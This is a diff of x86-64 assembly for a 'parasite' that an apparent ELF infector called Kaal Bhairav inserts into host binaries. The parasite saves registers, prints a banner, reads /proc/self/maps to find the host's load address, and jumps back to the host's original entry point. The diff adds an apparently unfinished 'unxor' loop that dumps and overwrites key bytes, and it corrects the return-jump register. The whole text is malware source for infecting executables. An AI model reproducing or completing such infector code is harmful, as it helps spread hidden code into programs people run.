@@ -35,6 +35,9 @@ SYS_EXECVE  equ 0x3b        ; 59
 ALLOC_SPACE equ 0x20		; 16 bytes
 
 O_RDONLY    equ 0x0         ; 0
+
+
+KEY_ADDR    equ 0x18        ; 24 bytes
 ;-x-x-x-x- CONSTANTS -x-x-x-x-;
 
 
@@ -48,10 +51,12 @@ _start:
 	push rdi
 	push r11
 	push r12
+	push r13
 	
 	jmp	parasite
 	message:	db	"-x-x-x-x- \_<O>_<O>_/ -x-x-x-x-", 0xa
 	filepath:   db  "/proc/self/maps", 0x0          ; 16 bytes
+	newline:	db 	0xa
 
 
 parasite:
@@ -67,8 +72,75 @@ parasite:
 									; dynamically identifying the address of the 'message' label.
 	xor rdx, rdx
 	mov dl, 0x20					; message size = 30 bytes
-	syscall					
+	syscall
 
+;--------------------------------------------------------------------
+
+unxor:
+
+	; Print our message
+	; %rax      | %rdi | %rsi | %rdx
+	; sys_write	|  fd  | *buf | count
+
+	xor rax, rax
+	add	rax, 0x01
+	mov rdi, rax
+	lea rsi, [rel _start-24]
+	xor rdx, rdx
+	mov dl, 0x10
+	syscall
+
+	xor rax, rax
+	add	rax, 0x01
+	mov rdi, rax
+	lea rsi, [rel newline]
+	xor rdx, rdx
+	mov dl, 0x1
+	syscall
+
+	xor r12, r12
+	%define countK r12b
+	mov countK,0
+
+	xor r13, r13
+	lea r13, [rel _start - KEY_ADDR]
+
+xorLoop:
+	mov rsi, r13
+	syscall
+	mov byte [r13], 0x41
+	lea rsi, [rel newline]
+	syscall
+
+	cmp countK, 14
+	je endXorLoop
+
+	inc countK
+	inc r13
+
+	jmp xorLoop
+
+endXorLoop:
+
+	lea r13, [rel _start - KEY_ADDR]
+	mov countK,0
+xorLoopbis:
+	mov rsi, r13
+	syscall
+	lea rsi, [rel newline]
+	syscall
+
+	cmp countK, 14
+	je endXorLoopbis
+
+	inc countK
+	inc r13
+
+	jmp xorLoopbis
+
+endXorLoopbis:
+
+;--------------------------------------------------------------------
 
 	; open file in memory
 	; %rax      |   %rdi    | %rsi  | %rdx
@@ -143,7 +215,7 @@ done:
 	xor r8, r8
 	mov r8, rbx                 ; r8 stores the base address where the infected binary is loaded
     mov r10, 0xAAAAAAAAAAAAAAAA
-    add r8, r10                 ; Computing final jmp-on-exit address
+    add r10, r8                 ; Computing final jmp-on-exit address
 
 
 ;-------------------------------------------------------------------
@@ -159,6 +231,7 @@ close_file:
 
 address_loaded_in_RBX:
 	; Restoring register state
+	pop r13
 	pop r12
 	pop r11
 	pop rdi
@@ -169,4 +242,4 @@ address_loaded_in_RBX:
 	; RBX contains the base address (where the program is loaded in memory), adding the offset of
 	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
 	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
-	jmp	r8
+	jmp	r10
